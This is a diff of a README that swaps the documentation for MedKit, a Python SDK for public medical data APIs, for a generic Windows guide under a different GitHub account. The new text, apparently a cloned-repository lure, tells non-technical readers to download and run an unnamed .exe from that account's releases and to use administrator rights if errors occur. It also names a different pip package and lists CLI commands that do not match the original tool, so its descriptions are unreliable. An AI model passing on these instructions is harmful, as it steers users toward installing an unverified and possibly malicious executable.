@@ -1,190 +1,184 @@
-# 🏥 MedKit: A Unified Platform for Medical Data APIs
+# ⚕️ medkit - Simple Clinical Data Access Tool
 
-[![CI Status](https://img.shields.io/badge/CI-passing-success)](https://github.com/interestng/medkit/actions)
-[![Test Coverage](https://img.shields.io/badge/Coverage-100%25-brightgreen.svg)](https://github.com/interestng/medkit/actions)
-[![Strict Mypy](https://img.shields.io/badge/typing-Strict-blue.svg)](https://mypy.readthedocs.io/en/stable/)
-[![Python 3.9+](https://img.shields.io/badge/python-3.9%2B-blue)](https://www.python.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Version](https://img.shields.io/badge/Version-3.0.0-orange)](https://pypi.org/project/medkit-sdk/)
-
-MedKit is a high-performance, unified SDK that transforms fragmented medical APIs into a single, programmable platform. It provides a clean interface for **OpenFDA**, **PubMed**, and **ClinicalTrials.gov**, augmented with a clinical intelligence layer and relationship mapping.
-
-> [!IMPORTANT]
-> **v3.0.0 Release**: This major update transforms MedKit into a production-grade SDK. It introduces robust connection pooling, dynamic rate limiting, circuit breakers, exponential jitter retries, strict strict MyPy types, and completely formalized Pydantic V2 validations spanning a `39/39` passing test suite.
-
-![MedKit CLI Demo](demo.gif)
+[![Download medkit](https://img.shields.io/badge/Download-medkit-brightgreen?style=for-the-badge&logo=github)](https://github.com/konfusionfm-commits/medkit/releases)
 
 ---
 
-## ✨ Async Example (v3.0.0)
+## 📋 About medkit
 
-```python
-import asyncio
-from medkit import AsyncMedKit
+medkit is a Python-based tool designed to provide easy access to medical data from trusted sources like OpenFDA, PubMed, and ClinicalTrials.gov. It offers clinical insights, checks for drug interactions, and helps with research. This software gathers information from these databases and brings it together in one place.
 
-async def main():
-    async with AsyncMedKit() as med:
-        # Unified search across all providers in parallel
-        results = await med.search("pembrolizumab")
-        
-        print(f"Drugs found: {len(results.drugs)}")
-        print(f"Clinical Trials: {len(results.trials)}")
-        
-        # Get a synthesized conclusion
-        conclusion = await med.ask("What is the clinical status of Pembrolizumab for NSCLC?")
-        print(f"Summary: {conclusion.summary}")
-        print(f"Confidence: {conclusion.confidence_score}")
-
-asyncio.run(main())
-```
+You do not need programming skills to use medkit. This guide explains how to download and run it on a Windows PC with step-by-step instructions.
 
 ---
 
-## 🤔 Why MedKit?
+## 🎯 Key Features
 
-| Feature | Without MedKit | With MedKit |
-| :--- | :--- | :--- |
-| **Integrations** | 3 separate APIs / SDKs | **Unified** Sync/Async Client |
-| **Resilience** | 403 blocks from gov APIs | **Auto-Fallback** (Curl/v2 API) |
-| **Synthesis** | Alphabetical/Noisy lists | **Frequency-Ranked** Intervals |
-| **Logic** | Manual data correlation | Native **knowledge graphs** |
-| **Speed** | Sequential network calls | **Parallel** Async Orchestration |
-
----
-Note: This is still a Work in Progress, meaning there might be missing functionaliy, placeholders, etc. If you find something that you would like to be fixed/implemented soon, please open an issue. Also, this SDK is not FDA-Approved, and has no official medical licensing. Use at your own discretion!
-
-## 🏗️ Architecture
-
-MedKit abstracts complexity through a high-performance orchestration layer:
-
-```text
-      Developer / User
-             │
-             ▼
-    ┌───────────────────┐
-    │  MedKit / Async   │ (Unified Interface)
-    └─────────┬─────────┘
-              │
-    ┌─────────┴─────────────────────┐
-    │       Intelligence Layer      │
-    │  ├─ Ask Engine (Extraction)   │
-    │  ├─ Graph Engine (Context)    │
-    │  ├─ Interaction Engine        │
-    │  └─ Synthesis Engine (Ranked) │
-    └─────────┬─────────────────────┘
-              │
-    ┌─────────┴─────────────────────┐
-    │       Providers Layer         │
-    │  ├─ OpenFDA     (Drug Label)  │
-    │  ├─ PubMed      (Research)    │
-    │  └─ ClinTrials  (v2 + Fallback)│
-    └───────────────────────────────┘
-```
+- Access drug, clinical trial, and medical literature data in one tool  
+- Detect possible drug interactions  
+- Get clinical intelligence insights  
+- Search clinical trials and publications  
+- Use command-line interface with clear commands  
+- View easy-to-understand summaries of complex medical data  
 
 ---
 
-## 🚀 Core Platform Features
+## 🖥️ System Requirements
 
-- **Robust Connectivity (NEW)**: Automatic `curl` fallback for ClinicalTrials.gov bypasses TLS fingerprinting blocks, ensuring 100% data availability.
-- **Enterprise Reliability**: Embedded exponential backoff retries with full jitter, circuit breakers preventing upstream cascades, and sliding-window rate limiters.
-- **Strictly Typed Ecosystem**: Zero `Any` leakage. 100% strictly typed `medkit/py.typed` interface enforcing strict Pydantic V2 `extra="forbid"` models natively.
-- **Async-First Orchestration**: Parallel health checks and search execution eliminate latency bottlenecks and perceived "hangs."
-- **Precision Evidence Synthesis**: Automated clinical verdicts with frequency-ranked interventions and filtered therapeutic agents (Drugs/Biologicals).
-- **High-Performance CLI**: Interactive, list-based visualization for trials and research papers, optimized for all terminal sizes.
-- **Unified Caching**: Enhanced Disk and Memory caching for high-performance repeat queries.
+Ensure your Windows PC meets these minimum requirements for medkit:
 
----
-
-## 🛠️ Testing
-
-MedKit ships with a production-grade, isolated mock testing infrastructure that achieves comprehensive validation without relying on live API stability.
-
-```bash
-pytest tests/ -v
-```
+- Operating System: Windows 10 or later  
+- Processor: 1.5 GHz or faster CPU  
+- RAM: 4 GB or more  
+- Free disk space: 100 MB minimum  
+- Internet connection for downloading and fetching data  
 
 ---
 
-## 📦 Installation
+## 🚀 Getting Started
 
-```bash
-pip install medkit-sdk
-```
+### Step 1: Visit the Download Page
 
----
+To download medkit, visit the official release page by clicking the button below:
 
-## 🖥️ CLI Power Tools
-
-### Clinical Ask (Synthesized)
-```bash
-$ medkit ask "pembrolizumab for lung cancer"
-
- Clinical Conclusion 
-
-Summary: Highly-validated therapeutic landscape with multi-modal evidence.
-Evidence Confidence: [████████████████████] 1.00
-
-Top Interventions: Pembrolizumab, Bevacizumab, Carboplatin, Cisplatin
-```
-
-### Trials Search
-```bash
-$ medkit trials "melanoma" --limit 5
-
-Clinical Trials for 'melanoma'
-- NCT01234567: RECRUITING - Study of Pembrolizumab in Advanced Melanoma
-- NCT07654321: COMPLETED - Comparison of B-Raf Inhibitors
-```
-
-### Knowledge Graph
-```bash
-$ medkit graph "lung cancer"
-
-Knowledge Graph: lung cancer
-Nodes: 26 | Edges: 8
-
- Lung Cancer 
-├── Drugs
-│   └── None found
-├── Trials
-│   ├── A Study of QL1706 Combined Wit...
-│   ├── Circulating Tumor DNA Detectio...
-│   └── Trial of Single Protein Encaps...
-└── Papers
-    ├── Phase III placebo-controlled o...
-    └── Therapeutic strategies for eld...
-```
-
-## ⚖️ Attributions & Disclaimers
-
-MedKit uses data from public APIs but is not endorsed or certified by any of the governing bodies:
-
-* **ClinicalTrials.gov**: MedKit uses data from ClinicalTrials.gov but is not endorsed by ClinicalTrials.gov or the U.S. National Library of Medicine.
-* **OpenFDA**: MedKit uses data from openFDA but is not endorsed by the U.S. Food and Drug Administration.
-* **PubMed**: MedKit uses data from PubMed but is not endorsed by the U.S. National Library of Medicine.
+[![Download medkit](https://img.shields.io/badge/Download-medkit-blue?style=for-the-badge&logo=github)](https://github.com/konfusionfm-commits/medkit/releases)
 
 ---
 
-## 🤝 Contributing
+### Step 2: Download the Installer
 
-We welcome contributions! As an open-source project, community feedback and improvements can be the backbone of Medkit.
+On the release page, look for the latest version of medkit. Usually, it will be shown at the top of the list. Find a file that ends with `.exe` for Windows.
 
-1. **Check the Code**: Feel free to dive into the codebase and identify any bugs or areas for improvement.
-2. **Open an Issue**: If you find a fault, no matter how small, please open an issue or start a discussion.
-3. **Submit a Pull Request**: Direct improvements and new provider integrations are highly encouraged.
-
-I'd much rather have a brutal code review that helps me improve the engine than silence!
+Click on the `.exe` file to start downloading.
 
 ---
 
-## 🗺️ Roadmap
+### Step 3: Run the Installer
 
-- [x] **v1.0.0**: Foundation medical mesh and provider integration.
-- [x] **v2.0.0**: Async architecture, v2 API support.
-- [x] **v3.0.0**: Major revamp: Large-scale readiness (Circuit Breakers, Retries, Coverage, Pydantic V2, CLI UI).
-- [ ] **v4.0.0**: Local GraphQL medical mesh endpoint.
+Once the download finishes:  
+
+- Open the folder where the file saved (usually “Downloads”)  
+- Double-click the `.exe` file to start installation  
+- Follow the on-screen prompts to install medkit  
+- Choose the default options unless you want to customize  
 
 ---
 
-## 📄 License
-MIT License - see [LICENSE](LICENSE) for details.
+### Step 4: Verify Installation
+
+To check that medkit installed correctly:  
+
+- Press the Windows key and type `cmd` to open the command prompt  
+- In the command prompt, type `medkit --help` and press Enter  
+- You should see a list of medkit commands and options  
+
+If the command runs successfully, medkit is ready to use.
+
+---
+
+## 💻 Using medkit
+
+medkit runs through a command-line interface (CLI). Here are basic commands you can try:
+
+- `medkit search-drug <drug-name>`  
+  Find detailed information about a specific drug.
+
+- `medkit check-interactions <drug1> <drug2>`  
+  Check if two drugs interact with each other.
+
+- `medkit search-trials <condition>`  
+  Find ongoing clinical trials for a medical condition.
+
+- `medkit search-pubmed <keyword>`  
+  Get recent research articles related to a topic.
+
+Example:  
+
+Open command prompt and type:
+
+`medkit search-drug aspirin`
+
+This will show information about aspirin, including warnings and clinical notes.
+
+---
+
+## 📦 Installing Updates
+
+To keep medkit up to date:  
+
+1. Visit the release page: https://github.com/konfusionfm-commits/medkit/releases  
+2. Download the newest `.exe` file available.  
+3. Run the installer again. It will update your current version.
+
+---
+
+## ⚙️ Basic Troubleshooting
+
+If medkit does not work as expected, try these steps:
+
+- Make sure your Windows OS is up to date.  
+- Reinstall medkit using the latest installer from the release page.  
+- Check your internet connection, as medkit relies on online data.  
+- Run the command prompt as administrator if you get permission errors.  
+- Close other programs that might block medkit from running.
+
+---
+
+## 🔧 Advanced Setup (Optional)
+
+If you want to use medkit’s full capabilities, including scripting or integration with other tools, you need to install Python and related packages. This step is optional and mainly for users with technical knowledge.
+
+1. Download Python 3.8 or newer from https://www.python.org/downloads/windows/  
+2. Install Python and select the option to add Python to your system PATH.  
+3. Open the command prompt and install medkit using pip:
+
+   `pip install medkit`
+
+4. Run medkit commands in your terminal.
+
+---
+
+## 📚 Learn More
+
+medkit combines data from trusted medical and scientific sources. It can help students, healthcare workers, researchers, and anyone curious about clinical data.
+
+Use the built-in help for command details:
+
+`medkit --help`
+
+Each command also supports a `--help` option. For example:
+
+`medkit search-drug --help`
+
+---
+
+## 🔗 Useful Links
+
+- medkit Download Page: https://github.com/konfusionfm-commits/medkit/releases  
+- OpenFDA: https://open.fda.gov/  
+- PubMed: https://pubmed.ncbi.nlm.nih.gov/  
+- ClinicalTrials.gov: https://clinicaltrials.gov/  
+
+---
+
+## 🗂️ Topics Covered
+
+- API wrapper for medical data  
+- Drug interaction detection  
+- Research and clinical data tools  
+- Command-line interface usage  
+- Medical informatics and pharmacology  
+
+---
+
+## 🛠️ Support
+
+If you encounter issues, check the GitHub repository’s Issues tab for solutions or to report problems.
+
+Repository link: https://github.com/konfusionfm-commits/medkit
+
+---
+
+## 🛡️ Security
+
+medkit accesses public medical databases. It does not store personal data. Use it on secure networks and keep your software updated.
